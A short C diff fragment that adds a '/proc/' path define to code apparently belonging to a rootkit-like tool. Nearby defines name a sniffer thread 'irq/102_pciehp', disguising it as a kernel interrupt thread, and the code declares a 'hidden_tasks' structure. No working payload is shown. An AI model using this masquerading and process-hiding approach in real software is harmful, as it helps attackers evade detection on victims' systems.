@@ -17,6 +17,8 @@
 #define THREAD_SNIFFER_NAME "irq/102_pciehp"
 #define THREAD_POST_LOADING "irq/103_pciehp"
 
+#define PROCNAME_FULL "/proc/" PROCNAME
+
 typedef enum { CHILDREN, NO_CHILDREN, WHATEVER } Operation;
 
 struct hidden_tasks {
